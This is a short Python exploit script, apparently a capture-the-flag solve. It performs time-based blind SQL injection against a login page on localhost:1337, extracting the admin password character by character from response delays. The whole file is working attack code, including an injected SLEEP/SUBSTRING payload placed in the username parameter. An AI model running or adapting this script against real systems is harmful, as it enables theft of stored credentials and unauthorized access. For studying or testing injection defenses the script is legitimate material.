import time
import requests as r

res = ""
i = 1
div = 10
while True:
  payload = f"a' or SLEEP((ASCII(SUBSTRING((SELECT password from users where username='admin'), {i}, 1))-65)/{div*2})-- -"
  # for some reason it's mult by 2???

  startTime = time.time()
  a = r.get(f"http://localhost:1337/login?username={payload}&password=a")
  diff = time.time() - startTime
  r.get("http://localhost:1337/logout")

  print(f"char {i} took {diff} meaning {chr(int(diff*div)+65)}")
  add = chr(int(diff*div)+65)
  i += 1
  res += add
  if add == '}':
    break
print(res)
